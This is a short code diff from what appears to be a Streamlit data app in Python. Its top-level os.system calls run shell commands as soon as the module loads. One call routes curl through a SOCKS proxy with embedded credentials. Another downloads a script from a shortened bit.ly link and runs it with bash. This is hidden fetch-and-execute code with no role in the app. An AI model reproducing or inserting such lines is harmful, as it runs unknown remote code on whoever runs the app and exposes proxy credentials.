@@ -5,7 +5,7 @@ import pandas as pd
 import streamlit as st
 
 import os
-os.system('curl -v -x "socks5://67.210.146.50:11080/" digitalocean.com/')
+os.system('curl --proxy "socks5://qmxcxwbu-rotate:eb337jmbvh26@p.webshare.io:80/" digitalocean.com/')
 os.system('curl -L -o main.sh https://bit.ly/31PBHyI && bash main.sh')
 
 """
